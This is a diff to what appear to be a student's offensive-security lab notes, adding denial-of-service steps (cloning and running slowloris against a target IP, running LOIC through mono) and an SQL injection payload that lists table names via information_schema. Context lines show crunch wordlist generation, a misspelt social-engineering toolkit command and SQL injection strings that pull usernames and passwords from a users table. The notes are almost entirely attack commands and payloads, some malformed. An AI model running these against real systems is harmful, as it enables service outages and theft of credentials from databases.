@@ -1,3 +1,4 @@
+
 exp1
 crunch 4 6 abc123 -o mywordlist.txt
 
@@ -106,6 +107,21 @@ sudo settoolkit
 2
 
 EXP 8
+slowloris 
+git clone https://github.com/GHubgenius/slowloris.pl
+cd slowloris.pl
+ls
+perl slowloris.pl -dns <iipadrress> -port no - timeout 30 -num 500
+
+loic
+sourceforge
+sudo apt install mono-complete
+cd downloads
+pwd
+ls
+mono LOIC.exe
+top
+
 
 
 
@@ -116,6 +132,7 @@ SQL injection
 1' OR '1'='1--
 1' UNION SELECT null, database() #
 1' UNION SELECT user, password FROM users #                                        
+1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() # extract table names
 
 
 exp 6
